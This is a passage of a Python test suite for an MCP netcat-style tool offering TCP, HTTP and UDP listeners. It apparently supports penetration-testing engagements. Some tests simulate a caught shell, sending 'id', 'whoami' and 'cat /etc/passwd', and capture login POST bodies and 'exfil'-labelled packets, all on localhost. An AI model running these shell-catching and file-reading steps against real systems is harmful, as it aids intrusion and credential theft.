            assert e.code == 404

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_file_delete_nonexistent(self, netcat_env):
        """Deleting a non-existent file returns error."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        resp_del = loop.run_until_complete(
            client.call("http_file", {
                "server_id": sid,
                "path": "/does-not-exist.html",
            })
        )
        assert_tool_error(resp_del, "not found")

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_file_auto_prefix_slash(self, netcat_env):
        """Path without leading / gets auto-prefixed."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]
        time.sleep(0.5)

        resp_add = loop.run_until_complete(
            client.call("http_file", {
                "server_id": sid,
                "path": "test.txt",
                "content": "test content",
            })
        )
        add_data = parse_tool_output(resp_add)
        assert add_data["path"] == "/test.txt"

        with urllib.request.urlopen(f"http://127.0.0.1:{port}/test.txt") as r:
            assert r.read().decode() == "test content"

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_file_custom_content_type(self, netcat_env):
        """Custom content_type overrides auto-detection."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        resp_add = loop.run_until_complete(
            client.call("http_file", {
                "server_id": sid,
                "path": "/data.bin",
                "content": "binary-like-data",
                "content_type": "application/octet-stream",
            })
        )
        add_data = parse_tool_output(resp_add)
        assert add_data["content_type"] == "application/octet-stream"

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_file_not_found_server(self, netcat_env):
        """http_file with invalid server_id returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("http_file", {
                "server_id": "http_nonexistent0",
                "path": "/test.html",
                "content": "test",
            })
        )
        assert_tool_error(resp, "not found")

    def test_http_listen_tls(self, netcat_env):
        """HTTP server with TLS starts correctly and serves HTTPS."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {
                "port": port,
                "tls": True,
                "files": {"/secure.html": "Secure Page"},
            })
        )
        data = parse_tool_output(resp)
        assert data["tls"] is True
        assert "https" in data["url"]
        sid = data["server_id"]

        time.sleep(0.5)
        # Connect with TLS (self-signed, so disable verification)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with urllib.request.urlopen(
                f"https://127.0.0.1:{port}/secure.html",
                context=ctx,
            ) as r:
                body = r.read().decode()
                assert "Secure Page" in body
        finally:
            loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_listen_port_in_use(self, netcat_env):
        """Starting HTTP server on occupied port returns error."""
        client, loop = netcat_env
        port = _free_port()

        resp1 = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data1 = parse_tool_output(resp1)
        sid1 = data1["server_id"]

        resp2 = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        assert_tool_error(resp2, "already in use")

        loop.run_until_complete(client.call("stop", {"id": sid1}))

    def test_http_listen_invalid_port(self, netcat_env):
        """HTTP server with invalid port returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("http_listen", {"port": 0})
        )
        assert_tool_error(resp, "Invalid port")

    def test_http_captures_post_body(self, netcat_env):
        """HTTP server captures POST request body."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        # POST request with body
        post_data = b"username=admin&password=secret"
        req = urllib.request.Request(
            f"http://127.0.0.1:{port}/login",
            data=post_data,
            method="POST",
        )
        try:
            urllib.request.urlopen(req)
        except urllib.error.HTTPError:
            pass  # 404 expected
        time.sleep(0.3)

        resp_r = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid})
        )
        r_data = parse_tool_output(resp_r)
        assert r_data["request_count"] >= 1
        post_req = None
        for r in r_data["requests"]:
            if r["method"] == "POST":
                post_req = r
                break
        assert post_req is not None, "POST request should be captured"
        assert "username=admin" in post_req["body"]

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_stop_http_returns_requests(self, netcat_env):
        """Stopping an HTTP server returns captured requests."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/final-check")
        except urllib.error.HTTPError:
            pass
        time.sleep(0.3)

        resp_stop = loop.run_until_complete(client.call("stop", {"id": sid}))
        stop_data = parse_tool_output(resp_stop)
        assert stop_data["type"] == "http"
        assert stop_data["total_requests"] >= 1
        assert "uptime_seconds" in stop_data

    def test_http_keepalive_clamp(self, netcat_env):
        """Keepalive is clamped to 1-30 range."""
        client, loop = netcat_env
        port = _free_port()

        # Request keepalive=0 (should clamp to 1)
        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port, "keepalive": 0})
        )
        data = parse_tool_output(resp)
        assert data["keepalive_minutes"] == 1
        loop.run_until_complete(client.call("stop", {"id": data["server_id"]}))

        port2 = _free_port()
        # Request keepalive=99 (should clamp to 30)
        resp2 = loop.run_until_complete(
            client.call("http_listen", {"port": port2, "keepalive": 99})
        )
        data2 = parse_tool_output(resp2)
        assert data2["keepalive_minutes"] == 30
        loop.run_until_complete(client.call("stop", {"id": data2["server_id"]}))


# ===========================================================================
# UDP TESTS
# ===========================================================================

class TestUDP:
    """Tests for udp_listen, udp_packets, udp_send, stop."""

    def test_udp_listen_basic(self, netcat_env):
        """Start UDP listener and verify it returns listener_id."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        result = assert_tool_success(resp)
        data = parse_tool_output(resp)
        assert "listener_id" in data
        assert data["port"] == port
        assert data["status"] == "listening"

        loop.run_until_complete(client.call("stop", {"id": data["listener_id"]}))

    def test_udp_listen_invalid_port(self, netcat_env):
        """UDP listen with invalid port returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": 0})
        )
        assert_tool_error(resp, "Invalid port")

    def test_udp_send_and_capture(self, netcat_env):
        """Send UDP packet from host and capture it."""
        client, loop = netcat_env
        port = _free_port()

        # Start listener
        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Send UDP packet from host
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"dns-exfil-data-here", ("127.0.0.1", port))
        sock.close()
        time.sleep(0.5)

        # Read packets
        resp_p = loop.run_until_complete(
            client.call("udp_packets", {"listener_id": lid})
        )
        p_data = parse_tool_output(resp_p)
        assert p_data["packet_count"] >= 1
        packet = p_data["packets"][0]
        assert "dns-exfil-data-here" in packet["data"]
        assert packet["data_hex"]  # Should have hex representation

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_udp_packets_clear(self, netcat_env):
        """clear=True empties the UDP packet buffer."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Send a packet
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"packet1", ("127.0.0.1", port))
        sock.close()
        time.sleep(0.3)

        # Read with clear
        resp_p = loop.run_until_complete(
            client.call("udp_packets", {"listener_id": lid, "clear": True})
        )
        p_data = parse_tool_output(resp_p)
        assert p_data["packet_count"] >= 1

        # Should be empty now
        resp_after = loop.run_until_complete(
            client.call("udp_packets", {"listener_id": lid})
        )
        after_data = parse_tool_output(resp_after)
        assert after_data["packet_count"] == 0

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_udp_packets_not_found(self, netcat_env):
        """udp_packets with invalid listener_id returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("udp_packets", {"listener_id": "udp_nonexistent00"})
        )
        assert_tool_error(resp, "not found")

    def test_udp_send_method(self, netcat_env):
        """udp_send sends a packet to a remote UDP port."""
        client, loop = netcat_env
        port = _free_port()

        # Set up a host UDP socket to receive
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        recv_sock.bind(("0.0.0.0", port))
        recv_sock.settimeout(5.0)

        try:
            # Send via MCP (container --network=host -> localhost)
            resp = loop.run_until_complete(
                client.call("udp_send", {
                    "host": "127.0.0.1",
                    "port": port,
                    "data": "hello-udp",
                })
            )
            result = assert_tool_success(resp)
            send_data = parse_tool_output(resp)
            assert send_data["bytes_sent"] == len("hello-udp")

            # Verify receipt
            data, addr = recv_sock.recvfrom(4096)
            assert data == b"hello-udp"
        finally:
            recv_sock.close()

    def test_udp_listen_port_in_use(self, netcat_env):
        """Starting two UDP listeners on the same port fails."""
        client, loop = netcat_env
        port = _free_port()

        resp1 = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        data1 = parse_tool_output(resp1)
        lid1 = data1["listener_id"]

        resp2 = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        assert_tool_error(resp2, "already in use")

        loop.run_until_complete(client.call("stop", {"id": lid1}))

    def test_stop_udp_returns_packets(self, netcat_env):
        """Stopping a UDP listener returns captured packets."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Send a packet
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"final-packet", ("127.0.0.1", port))
        sock.close()
        time.sleep(0.3)

        resp_stop = loop.run_until_complete(client.call("stop", {"id": lid}))
        stop_data = parse_tool_output(resp_stop)
        assert stop_data["type"] == "udp"
        assert stop_data["total_packets"] >= 1
        assert any("final-packet" in p["data"] for p in stop_data["packets"])


# ===========================================================================
# SHARED METHOD TESTS: connect, check_port, get_interfaces, list
# ===========================================================================

class TestSharedMethods:
    """Tests for connect, check_port, get_interfaces, list, stop."""

    def test_check_port_open(self, netcat_env):
        """check_port detects an open port with banner."""
        client, loop = netcat_env
        port = _free_port()

        echo = _TCPEchoServer(port, banner="SSH-2.0-OpenSSH_8.9\r\n")
        echo.start()
        time.sleep(0.3)

        try:
            resp = loop.run_until_complete(
                client.call("check_port", {"host": "127.0.0.1", "port": port})
            )
            result = assert_tool_success(resp)
            data = parse_tool_output(resp)
            assert data["open"] is True
            assert "SSH-2.0-OpenSSH_8.9" in data.get("banner", "")
        finally:
            echo.stop()

    def test_check_port_closed(self, netcat_env):
        """check_port detects a closed port (connection refused)."""
        client, loop = netcat_env
        # Use a port that nothing is listening on
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("check_port", {"host": "127.0.0.1", "port": port})
        )
        result = assert_tool_success(resp)  # check_port returns success even for closed ports
        data = parse_tool_output(resp)
        assert data["open"] is False
        assert data.get("status") == "closed"

    def test_check_port_filtered(self, netcat_env):
        """check_port detects a filtered port (timeout)."""
        client, loop = netcat_env
        # Use a non-routable address to trigger timeout
        resp = loop.run_until_complete(
            client.call("check_port", {
                "host": "192.0.2.1",  # TEST-NET, should timeout
                "port": 80,
                "timeout": 2,
            })
        )
        result = assert_tool_success(resp)
        data = parse_tool_output(resp)
        assert data["open"] is False
        assert data.get("status") == "filtered"

    def test_connect_to_server(self, netcat_env):
        """connect reads banner and optional echo from a TCP server."""
        client, loop = netcat_env
        port = _free_port()

        echo = _TCPEchoServer(port, banner="Welcome to the bind shell\n")
        echo.start()
        time.sleep(0.3)

        try:
            resp = loop.run_until_complete(
                client.call("connect", {
                    "host": "127.0.0.1",
                    "port": port,
                    "data": "id\n",
                    "timeout": 5,
                })
            )
            result = assert_tool_success(resp)
            data = parse_tool_output(resp)
            # connect does a single read(65536) -- it will get the banner and
            # possibly the echoed data if it arrives in the same TCP segment.
            assert "Welcome to the bind shell" in data["response"]
            assert data["data_sent"] == 3  # "id\n"
        finally:
            echo.stop()

    def test_connect_no_data(self, netcat_env):
        """connect without data still reads banner."""
        client, loop = netcat_env
        port = _free_port()

        echo = _TCPEchoServer(port, banner="BANNER\n")
        echo.start()
        time.sleep(0.3)

        try:
            resp = loop.run_until_complete(
                client.call("connect", {
                    "host": "127.0.0.1",
                    "port": port,
                    "timeout": 5,
                })
            )
            result = assert_tool_success(resp)
            data = parse_tool_output(resp)
            assert "BANNER" in data["response"]
        finally:
            echo.stop()

    def test_connect_refused(self, netcat_env):
        """connect to a closed port returns connection refused error."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("connect", {
                "host": "127.0.0.1",
                "port": port,
                "timeout": 2,
            })
        )
        assert_tool_error(resp, "Connection refused")

    def test_connect_timeout(self, netcat_env):
        """connect to a non-routable address times out."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("connect", {
                "host": "192.0.2.1",
                "port": 80,
                "timeout": 2,
            })
        )
        assert_tool_error(resp, "timeout")

    def test_get_interfaces(self, netcat_env):
        """get_interfaces returns network interface data."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("get_interfaces", {}))
        result = assert_tool_success(resp)
        data = parse_tool_output(resp)
        assert "interfaces" in data
        # With --network=host, container should see host interfaces
        ifaces = data["interfaces"]
        assert len(ifaces) > 0, "Should have at least one non-loopback interface"
        # Each interface should have name and addresses
        for iface in ifaces:
            assert "interface" in iface
            assert "addresses" in iface
            assert len(iface["addresses"]) > 0

    def test_list_empty(self, netcat_env):
        """list returns empty when no listeners are active."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("list", {}))
        result = assert_tool_success(resp)
        data = parse_tool_output(resp)
        assert "listeners" in data
        assert "total" in data

    def test_list_with_listeners(self, netcat_env):
        """list shows all active listeners."""
        client, loop = netcat_env
        tcp_port = _free_port()
        http_port = _free_port()
        udp_port = _free_port()

        # Start one of each
        r1 = loop.run_until_complete(
            client.call("listen", {"port": tcp_port, "timeout": 0})
        )
        d1 = parse_tool_output(r1)

        r2 = loop.run_until_complete(
            client.call("http_listen", {"port": http_port})
        )
        d2 = parse_tool_output(r2)

        r3 = loop.run_until_complete(
            client.call("udp_listen", {"port": udp_port})
        )
        d3 = parse_tool_output(r3)

        # List all
        resp = loop.run_until_complete(client.call("list", {}))
        data = parse_tool_output(resp)
        assert data["total"] >= 3

        types_found = {item["type"] for item in data["listeners"]}
        assert "tcp" in types_found
        assert "http" in types_found
        assert "udp" in types_found

        # Clean up
        loop.run_until_complete(client.call("stop", {"id": d1["listener_id"]}))
        loop.run_until_complete(client.call("stop", {"id": d2["server_id"]}))
        loop.run_until_complete(client.call("stop", {"id": d3["listener_id"]}))

    def test_stop_not_found(self, netcat_env):
        """stop with invalid ID returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("stop", {"id": "tcp_nonexistent00"})
        )
        assert_tool_error(resp, "not found")


# ===========================================================================
# CONTRACT TESTS -- tool.yaml vs server definitions
# ===========================================================================

class TestContract:
    """Verify tool.yaml and server agree on params, types, and required flags."""

    def test_yaml_method_params_match_server(self, netcat_env):
        """Every param in tool.yaml is accepted by the server's registered method."""
        client, _ = netcat_env
        yaml_path = TOOL_DIR / "tool.yaml"
        with open(yaml_path) as f:
            yaml_data = yaml.safe_load(f)

        ServerClass = _get_server_class()
        server = ServerClass()

        for method_name, method_yaml in yaml_data.get("methods", {}).items():
            yaml_params = set(method_yaml.get("params", {}).keys())
            server_method = server.methods.get(method_name)
            if server_method is None:
                continue
            server_params = set(server_method.params.keys())

            yaml_only = yaml_params - server_params
            server_only = server_params - yaml_params

            assert not yaml_only, (
                f"{method_name}: params in tool.yaml but not server: {yaml_only}"
            )
            assert not server_only, (
                f"{method_name}: params in server but not tool.yaml: {server_only}"
            )

    def test_yaml_required_flags_match_server(self, netcat_env):
        """Required flags in tool.yaml match server's param definitions."""
        yaml_path = TOOL_DIR / "tool.yaml"
        with open(yaml_path) as f:
            yaml_data = yaml.safe_load(f)

        ServerClass = _get_server_class()
        server = ServerClass()

        for method_name, method_yaml in yaml_data.get("methods", {}).items():
            server_method = server.methods.get(method_name)
            if server_method is None:
                continue

            for param_name, param_yaml in method_yaml.get("params", {}).items():
                yaml_required = param_yaml.get("required", False)
                server_param = server_method.params.get(param_name, {})
                server_required = server_param.get("required", False)

                assert yaml_required == server_required, (
                    f"{method_name}.{param_name}: yaml required={yaml_required} "
                    f"vs server required={server_required}"
                )


# ===========================================================================
# REGRESSION / EDGE CASE TESTS
# ===========================================================================

class TestRegression:
    """Regression and edge case tests based on engagement patterns."""

    def test_multiple_write_read_cycles(self, netcat_env):
        """Multiple write/read cycles work (simulates interactive shell)."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        sock.settimeout(5.0)
        time.sleep(0.3)

        # Simulate 3 command cycles
        commands = ["id\n", "whoami\n", "cat /etc/passwd\n"]
        responses = ["uid=0(root)\n", "root\n", "root:x:0:0:root:/root:/bin/bash\n"]

        for cmd, response in zip(commands, responses):
            # Write command via MCP
            resp_w = loop.run_until_complete(
                client.call("listener_write", {"listener_id": lid, "data": cmd})
            )
            assert_tool_success(resp_w)

            # "Shell" reads command and sends response
            received = sock.recv(4096)
            sock.sendall(response.encode())
            time.sleep(0.2)

            # Read response via MCP
            resp_r = loop.run_until_complete(
                client.call("listener_read", {"listener_id": lid, "timeout": 3})
            )
            r_data = parse_tool_output(resp_r)
            assert response.strip() in r_data["data"]

        sock.close()
        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_http_high_volume_requests(self, netcat_env):
        """HTTP server handles many requests without crashing."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        # Send 10 rapid requests
        for i in range(10):
            try:
                urllib.request.urlopen(f"http://127.0.0.1:{port}/req{i}")
            except urllib.error.HTTPError:
                pass

        time.sleep(0.5)

        resp_r = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid})
        )
        r_data = parse_tool_output(resp_r)
        assert r_data["request_count"] >= 10

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_udp_multiple_packets(self, netcat_env):
        """UDP listener captures multiple packets."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Send multiple packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(5):
            sock.sendto(f"packet-{i}".encode(), ("127.0.0.1", port))
        sock.close()
        time.sleep(0.5)

        resp_p = loop.run_until_complete(
            client.call("udp_packets", {"listener_id": lid})
        )
        p_data = parse_tool_output(resp_p)
        assert p_data["packet_count"] >= 5

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listener_read_timeout(self, netcat_env):
        """listener_read returns timeout error when no data is available."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Connect but don't send data
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        time.sleep(0.3)

        # Read should timeout
        resp_r = loop.run_until_complete(
            client.call("listener_read", {"listener_id": lid, "timeout": 2})
        )
        assert_tool_error(resp_r, "timeout")

        sock.close()
        loop.run_until_complete(client.call("stop", {"id": lid}))


# ===========================================================================
# ADDITIONAL UNIT TESTS -- pure Python, no Docker
# ===========================================================================

class TestUnitExtra:
    """Additional unit tests for command building, parsing, and edge cases."""

    def test_ensure_session_dir_creates(self, tmp_path, monkeypatch):
        """ensure_session_dir creates the directory if missing."""
        mod = _get_module()
        fake_dir = tmp_path / "netcat"
        monkeypatch.setattr(mod, "SESSION_DIR", fake_dir)
        result = mod.ensure_session_dir()
        assert result == fake_dir
        assert fake_dir.exists()

    def test_ensure_session_dir_idempotent(self, tmp_path, monkeypatch):
        """ensure_session_dir is safe to call twice."""
        mod = _get_module()
        fake_dir = tmp_path / "netcat"
        monkeypatch.setattr(mod, "SESSION_DIR", fake_dir)
        mod.ensure_session_dir()
        mod.ensure_session_dir()
        assert fake_dir.exists()

    def test_get_timestamp_is_utc(self):
        """get_timestamp returns UTC (Z suffix, not +00:00)."""
        mod = _get_module()
        ts = mod.get_timestamp()
        assert "+00:00" not in ts, "Should use Z not +00:00"
        assert ts.endswith("Z")

    def test_get_timestamp_millisecond_precision(self):
        """get_timestamp includes milliseconds."""
        mod = _get_module()
        ts = mod.get_timestamp()
        # Format: 2026-01-01T00:00:00.123Z -- dot + 3 digits before Z
        parts = ts.split(".")
        assert len(parts) == 2, f"Expected milliseconds in {ts}"
        ms_part = parts[1].rstrip("Z")
        assert len(ms_part) == 3, f"Expected 3 ms digits, got {len(ms_part)} in {ts}"

    def test_detect_content_type_htm(self):
        """.htm extension maps to text/html."""
        ServerClass = _get_server_class()
        server = ServerClass()
        assert server._detect_content_type("/page.htm") == "text/html"

    def test_detect_content_type_case_insensitive_ext(self):
        """Extension matching is case-insensitive."""
        ServerClass = _get_server_class()
        server = ServerClass()
        # The server lowercases the extension
        assert server._detect_content_type("/page.HTML") == "text/html"
        assert server._detect_content_type("/data.JSON") == "application/json"

    def test_detect_content_type_dotfile(self):
        """Dotfiles without extension get text/plain."""
        ServerClass = _get_server_class()
        server = ServerClass()
        assert server._detect_content_type("/.htaccess") == "text/plain"

    def test_detect_content_type_deep_path(self):
        """Content type detection works with nested paths."""
        ServerClass = _get_server_class()
        server = ServerClass()
        assert server._detect_content_type("/a/b/c/exploit.js") == "application/javascript"

    def test_tcp_listener_is_connected_no_writer(self):
        """TCPListener.is_connected returns False when writer is None."""
        mod = _get_module()
        listener = mod.TCPListener(id="tcp_test", port=4444)
        assert listener.is_connected() is False

    def test_tcp_listener_default_fields(self):
        """TCPListener has correct default timestamps and empty buffer."""
        mod = _get_module()
        listener = mod.TCPListener(id="tcp_t", port=5555)
        assert listener.connected_at is None
        assert listener.response_template is None
        assert listener.server is None
        assert listener.created_at > 0  # Should be a valid timestamp

    def test_http_server_default_keepalive(self):
        """HTTPServer defaults to 5 minutes keepalive."""
        mod = _get_module()
        server = mod.HTTPServer(id="http_t", port=8080)
        assert server.keepalive_minutes == 5
        assert server.persisted_file is None
        assert server.tls is False
        assert server.files == {}
        assert server.requests == []

    def test_udp_listener_default_fields(self):
        """UDPListener has empty packets list by default."""
        mod = _get_module()
        listener = mod.UDPListener(id="udp_t", port=5353)
        assert listener.packets == []
        assert listener.transport is None
        assert listener.protocol is None
        assert listener.persisted_file is None

    def test_udp_protocol_datagram_received(self):
        """UDPProtocol.datagram_received stores packets correctly."""
        mod = _get_module()
        listener = mod.UDPListener(id="udp_test", port=53)
        protocol = mod.UDPProtocol(listener)
        protocol.datagram_received(b"hello", ("10.10.14.5", 12345))
        assert len(listener.packets) == 1
        assert listener.packets[0].data == "hello"
        assert listener.packets[0].data_hex == "68656c6c6f"
        assert listener.packets[0].source_ip == "10.10.14.5"
        assert listener.packets[0].source_port == 12345

    def test_udp_protocol_binary_data(self):
        """UDPProtocol handles binary data with replacement chars."""
        mod = _get_module()
        listener = mod.UDPListener(id="udp_bin", port=53)
        protocol = mod.UDPProtocol(listener)
        binary_data = b"\x00\x01\x02\xff"
        protocol.datagram_received(binary_data, ("1.2.3.4", 999))
        assert len(listener.packets) == 1
        assert listener.packets[0].data_hex == "000102ff"
        # Binary bytes decoded with errors="replace"
        assert len(listener.packets[0].data) > 0

    def test_udp_protocol_multiple_packets(self):
        """UDPProtocol accumulates multiple packets."""
        mod = _get_module()
        listener = mod.UDPListener(id="udp_multi", port=53)
        protocol = mod.UDPProtocol(listener)
        for i in range(10):
            protocol.datagram_received(f"pkt{i}".encode(), ("10.0.0.1", 1000 + i))
        assert len(listener.packets) == 10
        assert listener.packets[5].data == "pkt5"
        assert listener.packets[5].source_port == 1005

    def test_generate_id_prefix_format(self):
        """generate_id uses uuid hex prefix of exactly 12 chars."""
        mod = _get_module()
        for prefix in ("tcp", "http", "udp", "test"):
            gid = mod.generate_id(prefix)
            parts = gid.split("_", 1)
            assert parts[0] == prefix
            assert len(parts[1]) == 12
            # Should be valid hex
            int(parts[1], 16)

    def test_http_request_dataclass(self):
        """HTTPRequest stores all fields correctly."""
        mod = _get_module()
        req = mod.HTTPRequest(
            timestamp="2026-01-01T00:00:00.000Z",
            method="POST",
            path="/login",
            query={"next": "/admin"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body="username=admin&password=secret",
            source_ip="192.168.1.100",
            source_port=54321,
        )
        assert req.method == "POST"
        assert req.path == "/login"
        assert req.query["next"] == "/admin"
        assert "username=admin" in req.body
        assert req.source_port == 54321

    def test_persist_requests_creates_jsonl(self, tmp_path):
        """_persist_requests writes requests as JSONL to session dir."""
        # Use _get_module() for both module-level patching AND server class
        # to ensure the same module's SESSION_DIR is used.
        mod = _get_module()
        orig_dir = mod.SESSION_DIR
        mod.SESSION_DIR = tmp_path
        try:
            server_inst = mod.NetcatServer()

            http_server = mod.HTTPServer(id="http_persist", port=8080)
            for i in range(3):
                http_server.requests.append(mod.HTTPRequest(
                    timestamp=f"2026-01-01T00:00:0{i}.000Z",
                    method="GET",
                    path=f"/page{i}",
                    query={},
                    headers={},
                    body="",
                    source_ip="127.0.0.1",
                    source_port=50000 + i,
                ))

            server_inst._persist_requests(http_server)
            assert http_server.persisted_file is not None
            # Read back the JSONL
            with open(http_server.persisted_file) as f:
                lines = f.readlines()
            assert len(lines) == 3
            first = json.loads(lines[0])
            assert first["path"] == "/page0"
            assert first["source_ip"] == "127.0.0.1"
        finally:
            mod.SESSION_DIR = orig_dir

    def test_check_persistence_below_threshold(self, tmp_path):
        """_check_persistence does not persist when below thresholds."""
        mod = _get_module()
        orig_dir = mod.SESSION_DIR
        mod.SESSION_DIR = tmp_path
        try:
            server_inst = mod.NetcatServer()

            http_server = mod.HTTPServer(id="http_small", port=8080)
            # Add only 5 requests (well below 50 threshold)
            for i in range(5):
                http_server.requests.append(mod.HTTPRequest(
                    timestamp=f"2026-01-01T00:00:0{i}.000Z",
                    method="GET",
                    path=f"/p{i}",
                    query={},
                    headers={},
                    body="",
                    source_ip="127.0.0.1",
                    source_port=50000 + i,
                ))

            server_inst._check_persistence(http_server)
            assert http_server.persisted_file is None
        finally:
            mod.SESSION_DIR = orig_dir

    def test_check_persistence_above_count_threshold(self, tmp_path):
        """_check_persistence triggers at >50 requests."""
        mod = _get_module()
        orig_dir = mod.SESSION_DIR
        mod.SESSION_DIR = tmp_path
        try:
            server_inst = mod.NetcatServer()

            http_server = mod.HTTPServer(id="http_big", port=8080)
            for i in range(55):
                http_server.requests.append(mod.HTTPRequest(
                    timestamp=f"2026-01-01T00:00:00.000Z",
                    method="GET",
                    path=f"/p{i}",
                    query={},
                    headers={},
                    body="",
                    source_ip="127.0.0.1",
                    source_port=50000,
                ))

            server_inst._check_persistence(http_server)
            assert http_server.persisted_file is not None
        finally:
            mod.SESSION_DIR = orig_dir

    def test_check_persistence_above_size_threshold(self, tmp_path):
        """_check_persistence triggers when data exceeds 100KB."""
        mod = _get_module()
        orig_dir = mod.SESSION_DIR
        mod.SESSION_DIR = tmp_path
        try:
            server_inst = mod.NetcatServer()

            http_server = mod.HTTPServer(id="http_large", port=8080)
            # Create a few requests with large bodies to exceed 100KB
            big_body = "A" * 40000
            for i in range(5):
                http_server.requests.append(mod.HTTPRequest(
                    timestamp=f"2026-01-01T00:00:00.000Z",
                    method="POST",
                    path=f"/big{i}",
                    query={},
                    headers={"Content-Type": "text/plain"},
                    body=big_body,
                    source_ip="127.0.0.1",
                    source_port=50000,
                ))

            server_inst._check_persistence(http_server)
            assert http_server.persisted_file is not None
        finally:
            mod.SESSION_DIR = orig_dir

    def test_persist_trims_in_memory(self, tmp_path):
        """After persistence, in-memory requests are trimmed to last 10."""
        mod = _get_module()
        orig_dir = mod.SESSION_DIR
        mod.SESSION_DIR = tmp_path
        try:
            server_inst = mod.NetcatServer()

            http_server = mod.HTTPServer(id="http_trim", port=8080)
            for i in range(25):
                http_server.requests.append(mod.HTTPRequest(
                    timestamp=f"2026-01-01T00:00:00.000Z",
                    method="GET",
                    path=f"/p{i}",
                    query={},
                    headers={},
                    body="",
                    source_ip="127.0.0.1",
                    source_port=50000,
                ))

            server_inst._persist_requests(http_server)
            # After _persist_requests, in-memory is trimmed to last 10
            assert len(http_server.requests) == 10
            # Last request should be /p24
            assert http_server.requests[-1].path == "/p24"
        finally:
            mod.SESSION_DIR = orig_dir

    def test_netcat_server_initial_state(self):
        """NetcatServer starts with empty listener/server dicts."""
        ServerClass = _get_server_class()
        server = ServerClass()
        assert server.tcp_listeners == {}
        assert server.http_servers == {}
        assert server.udp_listeners == {}

    def test_method_handler_types(self):
        """All registered method handlers are callable."""
        ServerClass = _get_server_class()
        server = ServerClass()
        for name, method in server.methods.items():
            assert method.handler is not None, f"{name}: handler is None"
            assert callable(method.handler), f"{name}: handler is not callable"


# ===========================================================================
# ACCEPTANCE TESTS -- call every method through the Docker container,
# validate structured response shape
# ===========================================================================

class TestAcceptance:
    """Call every method through the container. Verify:
    - The method exists and is callable
